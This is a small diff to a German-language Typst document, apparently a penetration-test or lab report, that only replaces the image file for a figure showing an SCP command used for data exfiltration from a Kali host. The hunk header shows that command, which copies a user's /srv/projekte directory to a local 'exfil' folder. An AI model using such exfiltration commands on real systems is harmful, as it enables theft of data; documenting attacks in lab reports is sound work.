@@ -51,7 +51,7 @@ scp -r m.vogel@192.168.50.20:/srv/projekte ~/exfil_projekte
 ```
 
 #figure(
-  image("../res/Images_Attack/scp_exfil.png", width: 90%),
+  image("../res/Images_Attack/new_scp_exfil.png", width: 90%),
   caption: [Ausführung des SCP-Befehls zur Datenexfiltration auf dem Kali-Host],
 ) <fig-scp-exfiltration>
 
